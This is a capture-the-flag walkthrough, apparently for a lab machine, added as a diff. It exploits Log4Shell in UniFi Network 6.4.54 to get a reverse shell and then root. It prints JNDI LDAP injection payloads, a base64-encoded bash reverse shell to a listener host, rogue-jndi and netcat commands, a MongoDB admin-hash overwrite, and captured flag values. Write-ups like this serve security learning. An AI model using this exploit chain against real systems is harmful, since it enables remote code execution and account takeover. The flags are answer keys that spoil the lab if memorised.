@@ -1,0 +1,45 @@
+first like usual let's start with a nmap : nmap -sC -sV -p- 10.129.11.162 (takes a lot of time in this box)
+we can find there some interesting ports like the 8443 where unifi network is running
+when we go to the web page we can't find any page so let's try to add the 8443 port to the url
+there we find a login form where we can see that the version 6.4.54 of unifi network is running
+if we search a vulnerability matching this version of unifi, we can find the CVE-2021-44228 vulnerability
+there we can find that the vulnerability comes from JDNI which is a java API, we can exploit this vulnerability using LDAP by creating a LDAP server wich will allow the web site to retrieve files from our machine (like the usual http server that we create)
+
+but first let's try to intercept a connection between our machine and the server
+let's lauch burpsuite and intercept a login request using random username and password 
+and then resend the request using the repeater request sender there we can see a error response 
+we've saw in a web ressource that to put : "${jndi:ldap://10.10.14.240/whatever}" in the remember field in order to try to use the vulnerability
+still get an error messaage
+so let's try to use tcpdump in order to intercept the request 
+we get that there is connection request sent in both ways so that means that we can send a payload to the server
+
+so now let's create our payload
+let's get a ldap server : git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package # we've installed our ldap server creator
+cd target
+now let's create our command that will give us a reverse shell but we want it in base64 : echo 'bash -c bash -i >&/dev/tcp/10.10.14.240/8083 0>&1' | base64
+the previous command returns us this : YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjQwLzgwODMgMD4mMQo= # it allows a revers shell on 8083
+so let's listen to 8083 : nc -lvnp 8083
+now let's lauch our ldap server : java -jar RogueJndi-1.1.jar -c "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjQwLzgwODMgMD4mMQo=}|{base64,-d}|{bash,-i}" -n "10.10.14.240" # it will lauch on our tun0 ip adress and execute the reverse shell command when it's triggered
+there we get a lot of ldap url, so now let's modifie our burpsuite request in order to trigger our ldap server, switching "${jndi:ldap://10.10.14.240/whatever}" by "${jndi:ldap://10.10.14.240:1389/o=tomcat}"
+now we send the request via burpsuite, and we get this in our rogue-jndi tab : Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+let's go in our netcat tab, and ... YAYY!! a reverse shell
+using this in the reverse shell to make it human friendly : script /dev/null -c bash
+going to cat /home/michael/user.txt
+""6ced1a6a89e666c0620cdb10262ba127""
+
+so now let's try to get or modify the administrator password in order to connect to the unifi database
+so we can see that it's a mongo db running on port 27117
+we can find that the default db name is ace 
+so let's connect to this db : mongo --port 27117 ace
+now that we're connect we can get the users using : db.admin.find() # we can see that there is a administrator user but with a uncrackable password
+so let's create a new password encrypted with SHA-512 : mkpasswd -m sha-512 root
+now let's modify the x_shadow parameter for administrator : db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$uqmVdugXh1enI8tr$x0iv.Yv1W506yw3NpTx93kenuZvUAjPNwgjly3fFkxecLL66P7YJxiE37p2HiK43dfdNdB9mm3/Hs/8xkYm9s0"}})
+now we can connect to the unifi db using root as password 
+
+Now that we're connected let's go to settings > site > DEVICE AUTHENTIFICATION we can see that the server allows ssh connection using root as user and NotACrackablePassword4U2022 as password 
+ssh root@10.129.178.3
+root flag in /root/root.txt
+""e50bc93c75b634e4b272d2f771c33681""
+
